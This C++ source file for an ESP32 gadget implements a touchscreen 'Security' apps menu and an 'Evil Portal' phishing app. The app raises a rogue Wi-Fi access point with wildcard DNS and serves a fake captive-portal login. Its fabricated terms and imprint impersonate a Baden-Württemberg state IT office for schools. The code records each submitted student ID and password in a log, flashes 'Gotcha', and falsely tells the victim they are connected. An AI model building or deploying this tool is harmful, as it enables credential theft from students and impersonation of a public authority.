// --- BadApps.cpp ---
#include <FS.h>         
#include <WebServer.h>  
#include <WiFi.h>
#include <DNSServer.h>

#include "BadApps.h"
#include "WebManager.h"
#include "Globals.h"
#include "Display.h"
#include "Logic.h"
#include "AppManager.h"

// =====================================================================
// =====================================================================
// Security Apps Menu (Page 23) — Modulares Package Menü
// =====================================================================
void renderBadMenu(TFT_eSprite *spr) {
    auto apps = AppManager::getAppsByCategory(CAT_SECURITY, true);
    int total = (int)apps.size();
    int perPage = 8;
    int maxPage = (total > 0) ? ((total - 1) / perPage) : 0;
    if (AppManager::secMenuPage > maxPage) AppManager::secMenuPage = maxPage;
    if (AppManager::secMenuPage < 0) AppManager::secMenuPage = 0;

    int curPage = AppManager::secMenuPage;
    int startIdx = curPage * perPage;
    int endIdx = min(startIdx + perPage, total);

    spr->setTextDatum(TC_DATUM);
    spr->setTextColor(TFT_RED);
    if (maxPage > 0) {
        char hBuf[32];
        snprintf(hBuf, sizeof(hBuf), "Security (%d/%d)", curPage + 1, maxPage + 1);
        spr->drawString(hBuf, 120, 2, 2);
    } else {
        spr->drawString("Security", 120, 2, 2);
    }
    spr->setTextDatum(MC_DATUM);

    int bW = 100, bH = 38, gapY = 4, startY = 22;
    for (int i = startIdx; i < endIdx; i++) {
        int slot = i - startIdx;
        int col = slot % 2;
        int row = slot / 2;
        int bx = (col == 0) ? 15 : 125;
        int by = startY + row * (bH + gapY);

        bool isRunning = (apps[i]->statusFn != nullptr) ? apps[i]->statusFn() : false;

        spr->fillRoundRect(bx, by, bW, bH, 8, cAppBG);
        uint16_t borderCol = isRunning ? apps[i]->color : cBatBG;
        spr->drawRoundRect(bx, by, bW, bH, 8, borderCol);

        // Icon Badge
        if (apps[i]->iconText.length() > 0) {
            spr->fillRoundRect(bx + 4, by + 9, 20, 20, 4, tft.color565(35, 15, 15));
            spr->setTextColor(apps[i]->color);
            spr->setTextDatum(MC_DATUM);
            spr->drawString(apps[i]->iconText, bx + 14, by + 19, 1);
        }

        spr->setTextColor(apps[i]->color);
        spr->setTextDatum(ML_DATUM);
        spr->drawString(apps[i]->name, bx + 28, by + bH / 2, 2);

        if (isRunning) {
            spr->fillCircle(bx + bW - 7, by + 8, 3, TFT_RED);
            spr->fillCircle(bx + bW - 7, by + 8, 1, 0xFFFF);
        }
    }

    // Paginierungs-Indikator unten
    if (maxPage > 0) {
        spr->setTextDatum(MC_DATUM);
        spr->setTextColor(0x8BD0);
        spr->drawString("<", 20, 200, 2);
        spr->drawString(">", 220, 200, 2);
        for (int p = 0; p <= maxPage; p++) {
            int dotX = 120 + (p - (float)maxPage / 2.0f) * 14;
            if (p == curPage) spr->fillCircle(dotX, 200, 3, TFT_RED);
            else spr->drawCircle(dotX, 200, 3, 0x52AA);
        }
    }
}

void handleBadMenuTouch(int x, int touchY) {
    auto apps = AppManager::getAppsByCategory(CAT_SECURITY, true);
    int total = (int)apps.size();
    int perPage = 8;
    int maxPage = (total > 0) ? ((total - 1) / perPage) : 0;
    int curPage = AppManager::secMenuPage;

    // Bottom Navigation Bar Tap (Page < >)
    if (maxPage > 0 && touchY >= 190) {
        if (x < 80 && curPage > 0) {
            AppManager::secMenuPage--;
            triggerVibration();
            lastSecond = -1;
            return;
        } else if (x > 160 && curPage < maxPage) {
            AppManager::secMenuPage++;
            triggerVibration();
            lastSecond = -1;
            return;
        }
    }

    int bH = 38, gapY = 4, startY = 22;
    int row = (touchY - startY) / (bH + gapY);
    int col = (x < 120) ? 0 : 1;
    int slot = row * 2 + col;

    if (row < 0 || row > 3 || touchY < startY) return;

    int idx = curPage * perPage + slot;
    if (idx >= total) return;

    AppManager::launchApp(apps[idx]->pageId);
}

// =====================================================================
// Evil Portal App (Page 12) — aus EvilPortalApp.cpp übernommen
// =====================================================================
void handleEvilRoot() {
    server.send(200, "text/html", evilHTML);
}

void handleEvilTOS() {
    String html = F(R"rawliteral(
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Nutzungsbedingungen</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f9; color: #333; padding: 20px; line-height: 1.6; }
        .content { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #0056b3; border-bottom: 2px solid #0056b3; padding-bottom: 10px; }
        h3 { color: #555; font-size: 16px; margin-top: 20px; }
        .btn-back { display: inline-block; margin-top: 20px; padding: 10px 20px; background-color: #0056b3; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="content">
        <h2>Nutzungsbedingungen für das Hotspot-WLAN</h2>
        <h3>1. Geltungsbereich</h3>
        <p>Diese Nutzungsbedingungen regeln die Inanspruchnahme des drahtlosen lokalen Netzwerks (WLAN) an öffentlichen Plätzen des Landes Baden-Württemberg.</p>
        <h3>2. Zulässige Nutzung</h3>
        <p>Das WLAN darf ausschließlich für edukative, recherchierende und persönliche Zwecke genutzt werden. Das Herunterladen von illegalen Inhalten oder das Umgehen von Netzwerksperren ist strengstens untersagt.</p>
        <h3>3. Datensicherheit und Protokollierung</h3>
        <p>Der Betreiber behält sich vor, Verbindungsdaten (IP-Adressen, MAC-Adressen, Zeitstempel) zur Sicherstellung des Netzbetriebs temporär zu protokollieren. Eine Verschlüsselung der übertragenen Daten wird nicht garantiert.</p>
        <h3>4. Haftungsausschluss</h3>
        <p>Die IT-Verwaltung übernimmt keine Haftung für Datenverluste, beschädigte Endgeräte oder missbräuchliche Nutzung durch Dritte.</p>
        <a href="/" class="btn-back">&larr; Zurück zum Login</a>
    </div>
</body>
</html>
)rawliteral");
    server.send(200, "text/html", html);
}

void handleEvilImprint() {
    String html = F(R"rawliteral(
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Impressum</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f9; color: #333; padding: 20px; line-height: 1.6; }
        .content { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #0056b3; border-bottom: 2px solid #0056b3; padding-bottom: 10px; }
        p { margin-bottom: 15px; }
        .btn-back { display: inline-block; margin-top: 20px; padding: 10px 20px; background-color: #0056b3; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="content">
        <h2>Impressum</h2>
        <p><strong>Angaben gemäß § 5 TMG:</strong></p>
        <p>IT-Verwaltung des Landes Baden-Württemberg<br>
        Abteilung für digitale Bildungsinfrastruktur<br>
        Schlossplatz 4<br>
        70173 Stuttgart</p>
        <p><strong>Vertreten durch:</strong><br>
        Direktorium für Netzwerktechnik</p>
        <p><strong>Kontakt:</strong><br>
        Telefon: +49 (0) 711 123-4567<br>
        E-Mail: support@it-bw.de</p>
        <p><strong>Verantwortlich für den Inhalt nach § 55 Abs. 2 RStV:</strong><br>
        Leitung der IT-Koordination Baden-Württemberg</p>
        <a href="/" class="btn-back">&larr; Zurück zum Login</a>
    </div>
</body>
</html>
)rawliteral");
    server.send(200, "text/html", html);
}

void handleEvilSubmit() {
    String schuelerID = server.hasArg("schueler_id") ? server.arg("schueler_id") : "Unbekannt";
    String passwort = server.hasArg("passwort") ? server.arg("passwort") : "Keins";

    time_t jetzt; time(&jetzt); struct tm *aktuell = localtime(&jetzt);
    char tBuf[20]; snprintf(tBuf, sizeof(tBuf), "%02d:%02d", aktuell->tm_hour, aktuell->tm_min);
    evilLog += "[" + String(tBuf) + "] ID: <b>" + schuelerID + "</b> -> PW: <span style='color:#ffaa00;'>" + passwort + "</span><br>";

    triggerVibration(); 
    showToast("Gotcha: " + schuelerID, 4000); 

    String html = F(R"rawliteral(
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Verbunden</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f9; padding: 50px 20px; color: #333; }
        .box { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; border-top: 5px solid #28a745; }
        h2 { color: #28a745; margin-top: 0; }
        p { color: #666; line-height: 1.5; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Authentifizierung erfolgreich</h2>
        <p>Ihre Zugangsdaten wurden verifiziert.<br><br>Sie sind nun mit dem Internet verbunden. Sie können dieses Fenster nun schließen.</p>
    </div>
</body>
</html>
)rawliteral");
    server.send(200, "text/html", html);
}

void toggleEvilPortal() {
    if (wlanActive) toggleWLAN();
    
    evilActive = !evilActive;
    if(evilActive) {
        if (ESP.getCpuFreqMHz() != 240) setCpuFrequencyMhz(240);
        WiFi.mode(WIFI_AP);
        WiFi.softAP(evilSSID.c_str());
        dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
        dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
        server.begin(); 
        showToast("Evil Portal AKTIV", 3000);
    } else {
        dnsServer.stop();
        server.stop(); 
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_OFF);
        showToast("Evil Portal BEENDET", 3000);
    }
}

void showEvilPortal(TFT_eSprite *spr) {
    spr->setTextDatum(TC_DATUM); spr->setTextColor(cFG); spr->drawString("Phishing Portal", 120, 10, 2);
    spr->setTextDatum(MC_DATUM); spr->setTextColor(cBatBG); spr->drawString("SSID: " + evilSSID, 120, 40, 2);
    
    uint16_t bCol = evilActive ? TFT_RED : TFT_DARKGREY;
    spr->fillRoundRect(40, 70, 160, 60, 10, bCol);
    spr->setTextColor(TFT_WHITE);
    spr->drawString(evilActive ? "AKTIV (Tippen = Stop)" : "INAKTIV (Tippen = Start)", 120, 100, 2);
    
    spr->setTextColor(cAcc1); 
    spr->drawString("Eintraege im Log:", 120, 160, 2);
    int logLines = 0; for(int i=0; i<evilLog.length(); i++) { if(evilLog.substring(i, i+4) == "<br>") logLines++; }
    spr->drawString(String(logLines), 120, 185, 4);
}

void handleEvilTouch(int x, int y) {
    if(y > 70 && y < 130 && x > 40 && x < 200) {
        triggerVibration(); 
        toggleEvilPortal();
    }
}
